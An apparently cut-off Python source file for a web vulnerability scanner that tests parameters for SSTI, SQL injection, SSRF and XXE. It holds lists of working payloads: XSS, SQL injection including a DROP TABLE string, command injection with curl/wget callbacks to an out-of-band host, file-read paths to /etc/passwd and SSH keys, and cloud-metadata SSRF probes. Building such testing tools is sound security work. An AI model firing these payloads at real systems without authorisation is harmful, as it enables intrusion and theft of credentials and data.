"""
VulnScanner — proof-based vulnerability detection engine.
Modules: XSS, SQLi, SSTI, LFI, SSRF, Open Redirect, Security Headers, GraphQL, IDOR.
"""

import json
import os
import threading
import time
import re
import hashlib
import random
from datetime import datetime, timezone
from typing import Any, Dict, Optional, List
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from bs4 import BeautifulSoup
import yaml

from modules.utils import (
    make_session, safe_get, safe_post, finding, finding_v2, log, Colors, url_in_scope,
    BaselineFingerprinter, VulnerabilityFinding, DeduplicationEngine,
    OOBDetectionFramework, BrowserValidator, VerificationStage,
    EvidenceStrength, ConfidenceLevel, calculate_confidence,
    evidence_strength_from_score, false_positive_risk_from_score,
    TechnologyFingerprinter,
)

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
]

DEFAULT_XSS_PAYLOADS: dict = {
    "reflected": XSS_PAYLOADS,
    "polyglot": [
        '"><svg/onload=alert(1)>',
        "';alert(1)//",
        '${alert(1)}',
        ' " onfocus=alert(1) autofocus= ',
        'expression(alert(1))',
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        '"><img src=x onerror=window.__bbh_xss=1>',
        "javascript:window.__bbh_xss=1",
    ],
}

CONTEXT_XSS_PAYLOADS = {
    "html": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<script>alert(1)</script>',
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus= ',
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
    ],
    "javascript": [
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
    ],
    "url": [
        "javascript:alert(1)",
        "javaScript:alert(1)",
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        "\"-window.__bbh_xss=1-\"",
    ],
}

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pls-", "ora-01756",
    "db2 sql error", "sqlite_error", "unclosed quotation mark",
    "quoted string not properly terminated", "syntax error",
    "pg_query", "sqlite3", "microsoft sql server", "jdbc",
    "sqlstate", "sql server", "pdo", "you have an error in your sql",
]

DEFAULT_SQLI_PAYLOADS = {
    "error_based": [
        "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
    ],
    "time_based": [
        "' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -',
        "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
    ],
    "boolean_based": [
        [" AND 1=1-- -", " AND 1=2-- -"],
        ["' AND '1'='1", "' AND '1'='2"],
        ["' AND 1=1--", "' AND 1=2--"],
    ],
    "oob": [
        "'; exec xp_dirtree '//{oob}/test'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\\\test'))",
        "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--",
    ],
}

SSTI_PAYLOADS = {
    "arithmetic": [
        "{{7*7}}", "{{7+7}}", "{{7-7}}",
        "${7*7}", "${7+7}",
        "<%=7*7%>", "<%=7+7%>",
        "#{7*7}", "#{7+7}",
    ],
    "engine_fingerprint": [
        ("twig", "{{7*'7'}}", "49"),
        ("jinja2", "{{7*'7'}}", "7777777"),
        ("freemarker", "${7*7}", "49"),
        ("velocity", "#set($x=7*7)$x", "49"),
        ("razor", "@(7*7)", "49"),
        ("smarty", "{$smarty.now}", ""),
        ("mustache", "{{7*7}}", "49"),
    ],
    "read_proof": [
        "{{config}}", "{{self._TemplateReference__context}}",
        "${7*7}", "#{7*7}",
    ],
}

SSTI_ENGINE_PATTERNS = {
    "jinja2": [
        re.compile(r"\{\{7\*'7'\}\}.*?7777777"),
        re.compile(r"\{\{config\}\}"),
        re.compile(r"cycler|joiner|namespace|lipsum|dict|url_for|get_flashed_messages"),
    ],
    "twig": [
        re.compile(r"\{\{7\*'7'\}\}.*?49"),
        re.compile(r"\{\{7\*7\}\}"),
        re.compile(r"self\._TemplateReference__context"),
    ],
    "freemarker": [
        re.compile(r"\$\{7\*7\}"),
    ],
    "smarty": [
        re.compile(r"\{\$smarty"),
    ],
}

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd", "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[boot loader]",
    "for 16-bit app support", "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8080", "http://localhost:8443",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation", "open",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "computeMetadata",
    "iam/security-credentials", "metadata",
]

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
]

CMD_INJECTION_PAYLOADS = {
    "unix": [
        ("; id", "uid="),
        ("| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; uname -a", "Linux"),
        ("| uname -a", "Linux"),
        ("; whoami", ""),
        ("| whoami", ""),
        ("; ping -c 1 127.0.0.1", ""),
        ("| ping -c 1 127.0.0.1", ""),
        ("; sleep 5", ""),
        ("| sleep 5", ""),
        ("`sleep 5`", ""),
    ],
    "windows": [
        ("| ver", "Microsoft"),
        ("& ver", "Microsoft"),
        ("; systeminfo", "OS"),
        ("| systeminfo", "OS"),
        ("& ping -n 5 127.0.0.1", ""),
        ("| ping -n 5 127.0.0.1", ""),
        ("& timeout 5", ""),
        ("| timeout 5", ""),
    ],
    "time_based": [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("| ping -c 5 127.0.0.1", 5),
        ("& ping -n 5 127.0.0.1", 5),
    ],
    "oob": [
        "| nslookup {oob}",
        "; nslookup {oob}",
        "`nslookup {oob}`",
        "| curl http://{oob}/cmd",
        "; curl http://{oob}/cmd",
        "| wget http://{oob}/cmd",
        "; wget http://{oob}/cmd",
    ],
}

CMD_INJECTION_OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=", "Linux", "Microsoft",
    "OS Version", "OS Name", "load average", "up ",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}")),
    ("GitHub Token", re.compile(r"(?:ghp_|github_pat_|gho_|ghu_|ghs_|ghr_)[A-Za-z0-9_]{36,}")),
    ("Slack Token", re.compile(r"(?:xox[baprs]-|xapp-)[0-9A-Za-z-]{10,}")),
    ("Private RSA Key", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("Private EC Key", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com",
    "https://evil.com%2F%2F", "/\\evil.com",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

CSRF_TOKEN_NAMES = {
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "token", "csrf", "xsrf-token", "xsrf_token",
    "anti_csrf_token", "_csrf", "_token",
}

COMMON_DIRFUZZ_PATHS = [
    "admin/", "login/", "dashboard/", "config/", "backup/", "uploads/",
    "portal/", "server-status", "shell/", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "vendor/", ".git/", ".env", ".gitignore",
]

EXPOSED_FILES = [
    ".env", ".env.local", ".env.backup", "/.git/config", "/.gitignore",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/phpinfo.php",
    "/wp-config.php", "/wp-config.php.bak", "/.DS_Store", "/web.config",
    "/web.config.bak", "/config.php", "/config.xml", "/.htaccess",
    "/.htpasswd", "/web.xml", "/pom.xml", "/.aws/credentials",
    "/.ssh/id_rsa", "/Dockerfile", "/.dockerignore", "/docker-compose.yml",
    "/secrets.txt", "/passwords.txt", "/.env.example",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}

TAKEOVER_SIGNATURES = [
    "NoSuchBucket", "There isn't a GitHub Pages site here.",
    "Fastly error: unknown domain", "No such app",
    "The requested URL was not found on this server.",
    "A DNS leak or misconfiguration", "NoSuchDomain", "No such host",
]

CLICKJACKING_SAFE_DIRECTIVES = [
    "frame-ancestors 'none'", "frame-ancestors 'self'", "frame-ancestors https:",
]

# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict):
        self.config    = config
        self.recon     = recon_data
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.base_url  = config.get("target", "").rstrip("/")
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()
        self.dedup     = DeduplicationEngine()
        self.oob       = OOBDetectionFramework(config)
        self.browser   = BrowserValidator(config)

        self.waf_detected = False
        self.baselines    = BaselineFingerprinter(self.session, self.timeout)
        self.tech_fingerprinter = TechnologyFingerprinter(self.session, self.timeout)
        self._prepared    = False

    # ── Dedup Wrapper ────────────────────────────────────────────────────

    def _add(self, f: Optional[dict]) -> bool:
        if not f:
            return False
        with self._lock:
            added = self.dedup.add_legacy(f)
            if added is None:
                return False
            return True

    def _get_findings(self) -> list[dict]:
        return self.dedup.get_findings()

    # ── Legacy Backward-Compat Helpers (used by ApiScanner, IdorScanner) ──

    def _append_finding(self, findings_list: list, f: Optional[dict]) -> None:
        if f:
            findings_list.append(f)

    def _record_confirmed(self, findings_list: list, vuln_type: str, url: str,
                          severity: str, details: str, evidence: str,
                          method: str, request_data: Any = None) -> None:
        f = finding(
            vuln_type=vuln_type, url=url, severity=severity,
            details=details, evidence=evidence, confidence="confirmed",
        )
        self._append_finding(findings_list, f)

    def _deduplicate(self, findings_list: list[dict]) -> list[dict]:
        seen = set()
        result = []
        for f in findings_list:
            key = (f.get("vuln_type", ""), f.get("url", ""), f.get("evidence", ""))
            if key not in seen:
                seen.add(key)
                result.append(f)
        return result

    # ── Helpers ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _normalize_list(self, value):
        if value is None:
            return []
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        if isinstance(value, list):
            return value
        return [value]

    def _get_module_param(self, module_name, key, default=None):
        return self.config.get("module_params", {}).get(module_name, {}).get(key, default)

    def _load_sqli_payloads(self) -> dict:
        yaml_path = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "payloads", "sqli.yaml"
        )
        try:
            with open(yaml_path, "r") as f:
                loaded = yaml.safe_load(f)
            if loaded and "payloads" in loaded:
                return loaded["payloads"]
        except (FileNotFoundError, yaml.YAMLError):
            pass
        return DEFAULT_SQLI_PAYLOADS

    def _load_xss_payloads(self) -> dict:
        yaml_path = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "payloads", "xss.yaml"
        )
        try:
            with open(yaml_path, "r") as f:
                loaded = yaml.safe_load(f)
            if loaded and "payloads" in loaded:
                return loaded["payloads"]
        except (FileNotFoundError, yaml.YAMLError):
            pass
        return DEFAULT_XSS_PAYLOADS

    def _in_scope(self, url: str) -> bool:
        return url_in_scope(url, self.config)

    def _extract_param_name(self, f: dict) -> str:
        for text in (f.get("details", ""), f.get("evidence", "")):
            if "Parameter '" in text:
                return text.split("Parameter '")[1].split("'")[0]
            if "Form field '" in text:
                return text.split("Form field '")[1].split("'")[0]
        url = f.get("url", "")
        if "?" in url:
            params = parse_qs(urlparse(url).query)
            if params:
                return next(iter(params.keys()))
        return ""

    def _run_threaded(self, fn, items):
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    def _prepare_scan(self) -> None:
        if self._prepared:
            return
        self._prepared = True
        self._detect_waf()
        self._fingerprint_baselines()
        self._fingerprint_tech()
        self._log_tech_fingerprints()

    def _detect_waf(self) -> None:
        target = self.config.get("target", "")
        if not target:
            return
        safe_url = target.rstrip("/") + "/"
        blocked = 0
        for probe in ("' OR 1=1--", "<script>alert(1)</script>"):
            try:
                r = safe_get(self.session, safe_url + "?" + urlencode({"q": probe}),
                             self.timeout, raise_for_status=False)
                if r and r.status_code in (403, 406, 429):
                    blocked += 1
            except Exception:
                continue
        if blocked >= 2:
            self.waf_detected = True
            log("[!] WAF detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

    def _fingerprint_baselines(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.baselines.fingerprint(url)
            except Exception:
                continue

    def _fingerprint_tech(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.tech_fingerprinter.fingerprint(url)
            except Exception:
                continue
        self.config["technology"] = self.tech_fingerprinter.all()

    def _log_tech_fingerprints(self) -> None:
        summary = self.tech_fingerprinter.summary()
        if summary and summary != "Unknown":
            log(f"  [Tech] {summary}", Colors.CYAN, verbose_only=True, verbose=self.verbose)

    def _get_target_scheme(self):
        return urlparse(self.config.get("target", "")).scheme.lower()

    def _same_origin(self, action_url: str) -> bool:
        target = urlparse(self.config.get("target", ""))
        action = urlparse(action_url)
        return action.netloc == "" or action.netloc == target.netloc

    # ═════════════════════════════════════════════════════════════════════
    # SSTI — 4-Stage Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_ssti(self) -> list[dict]:
        """
        4-stage SSTI detection:
        Stage 1: Detect reflection of template syntax.
        Stage 2: Fingerprint engine with engine-specific payloads.
        Stage 3: Verify evaluation occurred (arithmetic result).
        Stage 4: Attempt safe read-only proof.
        """
        findings: list[dict] = []

        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    result = self._ssti_test_parameter(url, param)
                    if result:
                        findings.append(result)
            except Exception as e:
                log(f"  [SSTI] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _ssti_test_parameter(self, url: str, param: str) -> Optional[dict]:
        # Stage 1: Arithmetic reflection detection
        arithmetic_results = []
        for payload in SSTI_PAYLOADS["arithmetic"]:
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text

            # Check for arithmetic result (7*7 → 49)
            if "49" in body and "{{7*7}}" in body:
                arithmetic_results.append(("arithmetic", "{{7*7}} → 49", test_url, body))
            elif "49" in body and "${7*7}" in body:
                arithmetic_results.append(("arithmetic", "${7*7} → 49", test_url, body))
            elif payload in body:
                arithmetic_results.append(("reflection", payload, test_url, body))

        if not arithmetic_results:
            return None

        has_arithmetic = any(r[0] == "arithmetic" for r in arithmetic_results)

        # Stage 2: Engine fingerprinting
        engine_sigs = []
        for engine, payload, expected in SSTI_PAYLOADS["engine_fingerprint"]:
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if resp and expected and expected in resp.text:
                engine_sigs.append(engine)
            elif resp and payload in resp.text:
                engine_sigs.append(f"reflected_{engine}")

        # Stage 3: Verify evaluation
        verified_engine = None
        for engine, pattern_list in SSTI_ENGINE_PATTERNS.items():
            for pattern in pattern_list:
                for _, _, _, body in arithmetic_results:
                    if pattern.search(body):
                        verified_engine = engine
                        break
                if verified_engine:
                    break
            if verified_engine:
                break

        # Stage 4: Read-proof attempt (safe, non-destructive)
        read_proof = []
        if verified_engine or has_arithmetic:
            for payload in SSTI_PAYLOADS["read_proof"]:
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if resp and len(resp.text) > 500 and payload not in resp.text:
                    read_proof.append(payload)

        # Determine confidence tier
        if verified_engine and read_proof:
            title = "Confirmed SSTI"
            severity = "critical"
            evidence = f"Engine: {verified_engine}, Arithmetic: true, Read-proof: {' '.join(read_proof[:2])}"
            stage = VerificationStage.EXPLOITABLE.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine fingerprinted as {verified_engine}",
                f"Stage 3: Engine-specific evaluation verified",
                f"Stage 4: Read-proof payloads produced output",
            ]
        elif verified_engine or has_arithmetic:
            title = "Likely SSTI"
            severity = "high"
            evidence = f"Arithmetic: {has_arithmetic}, Engine sigs: {', '.join(engine_sigs[:3])}"
            stage = VerificationStage.VALIDATED.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine signals: {', '.join(engine_sigs[:3])}",
                f"Stage 3: Evaluation suspected",
            ]
        else:
            title = "Potential SSTI"
            severity = "medium"
            evidence = f"Payloads reflected: {', '.join(r[1][:40] for r in arithmetic_results[:2])}"
            stage = VerificationStage.DETECTED.value
            vsteps = [
                f"Stage 1: Template syntax reflected in response",
            ]

        return finding(
            vuln_type=title,
            url=list(set(r[2] for r in arithmetic_results))[0],
            severity=severity,
            details=f"Parameter '{param}': {title.lower()} detected",
            evidence=evidence,
            verification_stage=stage,
            validation_steps=vsteps,
        )

    # ═════════════════════════════════════════════════════════════════════
    # SQLi — Multi-Signal Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_sqli(self) -> list[dict]:
        """
        Multi-signal SQLi detection:
        1. Error-based (must match SQL error strings)
        2. Boolean-based (AND 1=1 vs AND 1=2 response diffing)
        3. Time-based (requires >4.5s delay, repeatable)
        4. OOB (requires callback verification)
        Requires multiple signals before marking Confirmed.
        """
        self._prepare_scan()
        payloads = self._load_sqli_payloads()
        oob_host = self.config.get("oob_host")

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                for param, values in query.items():
                    original_value = values[0] if values else "1"
                    signals = self._sqli_test_parameter(url, param, original_value, payloads, oob_host)
                    if signals:
                        f = self._sqli_build_finding(url, param, signals)
                        if f:
                            self._add(f)
            except Exception as e:
                log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _sqli_test_parameter(self, url: str, param: str, original_value: str,
                              payloads: dict, oob_host: Optional[str]) -> dict:
        signals = {"error": False, "boolean": False, "time": False, "oob": False}
        evidence_parts = []

        # ── Error-based ───────────────────────────────────────────────
        for payload in payloads.get("error_based", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower_body = resp.text.lower()
            matched = [err for err in SQLI_ERRORS if err in lower_body]
            if matched:
                signals["error"] = True
                evidence_parts.append(f"error:{matched[0]}")
                break

        # ── Boolean-based ────────────────────────────────────────────
        boolean_pairs = payloads.get("boolean_based", [])
        if boolean_pairs:
            baseline = safe_get(self.session, url, self.timeout)
            if baseline:
                baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
                baseline_len = len(baseline.text)
                for true_cond, false_cond in boolean_pairs:
                    true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
                    false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if not (true_resp and false_resp):
                        continue
                    true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    true_normal = baseline_hash == true_hash or abs(baseline_len - true_len) <= 50
                    false_diff = baseline_hash != false_hash and abs(baseline_len - false_len) > 50
                    if true_normal and false_diff:
                        signals["boolean"] = True
                        evidence_parts.append("boolean:AND 1=1 vs AND 1=2 diff")
                        break

        # ── Time-based (repeatability check) ─────────────────────────
        for payload in payloads.get("time_based", []):
            test_url = self._inject_param(url, param, payload)
            delays = []
            for _ in range(2):
                start = time.time()
                safe_get(self.session, test_url, 15, raise_for_status=False)
                delays.append(time.time() - start)
            if all(delay > 4.5 for delay in delays):
                signals["time"] = True
                evidence_parts.append(f"time:delays={delays}")
                break

        # ── OOB ──────────────────────────────────────────────────────
        if oob_host:
            for payload in payloads.get("oob", []):
                formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, formatted)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("sqli", formatted, test_url)
                evidence_parts.append(f"oob:sent to {oob_host}")
                signals["oob"] = True
                break

        return signals

    def _sqli_build_finding(self, url: str, param: str, signals: dict) -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = []
        for k, v in signals.items():
            if v:
                evidence_parts.append(k)

        if signal_count >= 3:
            title = "SQL Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 2:
            title = "Likely SQL Injection"
            severity = "high"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential SQL Injection"
            severity = "medium"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            verification_stage=stage,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )

    # ═════════════════════════════════════════════════════════════════════
    # SSRF — OOB-Only Confirmation
    # ═════════════════════════════════════════════════════════════════════

    def scan_ssrf(self) -> list[dict]:
        """
        SSRF detection with OOB-only confirmation.
        Parameter-name heuristics (url=, uri=, path=, dest=) alone never
        produce findings. Only OOB-confirmed or cloud-metadata-proven
        interactions become findings.
        """
        oob_host = self.config.get("oob_host")
        findings: list[dict] = []

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                original_params = parse_qs(parsed.query)
                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline = (
                    hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None,
                    len(baseline_resp.text) if baseline_resp else 0,
                )

                for param in params:
                    for payload in SSRF_PAYLOADS:
                        test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                        resp = safe_get(self.session, test_url, self.timeout)
                        if not resp:
                            continue

                        # Check cloud metadata signatures
                        body = resp.text
                        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
                        if matched and len(matched) >= 2:
                            f = finding(
                                vuln_type="Confirmed SSRF",
                                url=test_url,
                                severity="critical",
                                details=f"Parameter '{param}' returned internal cloud metadata ({len(matched)} signatures)",
                                evidence=f"Signatures: {', '.join(matched[:3])}",
                                verification_stage=VerificationStage.VALIDATED.value,
                                validation_steps=[f"Cloud metadata signature matched: {s}" for s in matched],
                            )
                            if f:
                                self._add(f)

                        # OOB callback
                        if oob_host:
                            oob_url = self._build_ssrf_url(url, parsed, original_params, param,
                                                           f"http://{self.oob.callback_token}.{oob_host}/ssrf")
                            safe_get(self.session, oob_url, self.timeout, raise_for_status=False)
                            self.oob.register_interaction("ssrf", oob_url, test_url)

            except Exception as e:
                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            f = finding(
                vuln_type="Confirmed SSRF (OOB)",
                url=entry.get("url", ""),
                severity="critical",
                details=f"OOB callback received for SSRF probe",
                evidence=f"Callback: {entry.get('payload', '')}",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed"],
            )
            if f:
                self._add(f)

        return self._get_findings()

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    # ═════════════════════════════════════════════════════════════════════
    # XXE — In-Band + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_xxe(self) -> list[dict]:
        """
        XML External Entity (XXE) detection.

        In-Band: Submit XML with entity that reads /etc/passwd, check for file contents.
        OOB:     Submit XML that triggers callback to OOB host.
        Error:   Submit malformed XML that leaks file contents via error messages.
        """
        findings: list[dict] = []
        oob_host = self.config.get("oob_host")

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            signals = {"in_band": False, "error": False, "oob": False}
            evidence_parts = []

            xml_headers = {"Content-Type": "application/xml"}

            # In-Band: file read via entity
            for payload in XXE_PAYLOADS["in_band"]:
                try:
                    resp = safe_post(self.session, url, payload,
                                     self.timeout, headers=xml_headers)
                    if not resp:
                        continue
                    body = resp.text
                    for sig in XXE_SIGNATURES:
                        if sig in body:
                            signals["in_band"] = True
                            evidence_parts.append(f"in_band:{sig}")
                            f = finding(
                                vuln_type="XML External Entity (XXE) Injection",
                                url=url, severity="critical",
                                details="In-band XXE: file content returned in response via XML entity",
                                evidence=f"Signature: {sig!r}",
                                verification_stage=VerificationStage.VALIDATED.value,
                                validation_steps=[f"In-band XXE payload returned file content: {sig}"],
                            )
                            if f:
                                self._add(f)
                            log(f"  [XXE] In-band {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            break
                    if signals["in_band"]:
                        break
                except Exception:
                    continue

            # Error-based: file read via error message
            if not signals["in_band"]:
                for payload in XXE_PAYLOADS["error_based"]:
                    try:
                        resp = safe_post(self.session, url, payload,
                                         self.timeout, headers=xml_headers)
                        if not resp:
                            continue
                        body = resp.text
                        for sig in XXE_SIGNATURES:
                            if sig in body:
                                signals["error"] = True
                                evidence_parts.append(f"error:{sig}")
                                f = finding(
                                    vuln_type="XML External Entity (XXE) Injection",
                                    url=url, severity="critical",
                                    details="Error-based XXE: file content leaked via parser error message",
                                    evidence=f"Signature: {sig!r}",
                                    verification_stage=VerificationStage.VALIDATED.value,
                                    validation_steps=["Error-based XXE payload leaked file content"],
                                )
                                if f:
                                    self._add(f)
                                log(f"  [XXE Error] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        if signals["error"]:
                            break
                    except Exception:
                        continue

            # OOB-based blind XXE
            if oob_host and not signals["in_band"] and not signals["error"]:
                for payload in XXE_PAYLOADS["oob"]:
                    try:
